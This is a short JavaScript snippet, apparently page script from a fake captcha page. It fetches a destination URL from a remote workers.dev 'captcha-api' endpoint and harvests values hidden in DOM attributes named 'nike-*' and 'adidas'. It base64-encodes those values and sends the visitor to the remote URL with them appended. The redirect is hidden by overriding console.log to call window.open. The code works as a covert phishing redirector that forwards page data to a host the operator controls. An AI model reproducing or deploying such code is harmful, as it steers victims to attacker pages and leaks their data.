

const urlx = 'https://captcha-api.rbarsuqlia.workers.dev';

        // Function to perform GET request
        async function fetchData() {
            try {
                
                const response = await fetch(urlx);

                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }

                
                const data = await response.json();
                
                const message = data.message;

                return message ;

                
                let messageUrl = message;

            } catch (error) {
                // Handle errors
                console.error('There was a problem with the fetch operation:', error);
            }
        }


       async function run() {
        console.log("readya!");
        let key = "";
        let jk = "";
        const originalConsoleLog = console.log;
        console.log = function(message) {
            window.open(message,"_self")
            originalConsoleLog.apply(console, arguments);
        };
        
        const elements = document.querySelectorAll('*'); // Select all elements in the DOM
            elements.forEach((element) => {
                Array.from(element.attributes).forEach((attr) => {
                    if (attr.name.startsWith('nike-')) {
                      
                        let dynamicPart = attr.name.split('nike-')[1];
                        key = dynamicPart;
                        
                        
                    }
                });
            });
            elements.forEach((element) => {
                Array.from(element.attributes).forEach((attr) => {
                    if (attr.name == "adidas") {
                      jk = attr.value
                    }
                });
            });
        let aha = btoa(`${jk}&${key}&a`)
        
        let mw = await fetchData();

        console.log(`${mw}${aha}`)
        }

        run()

        
        
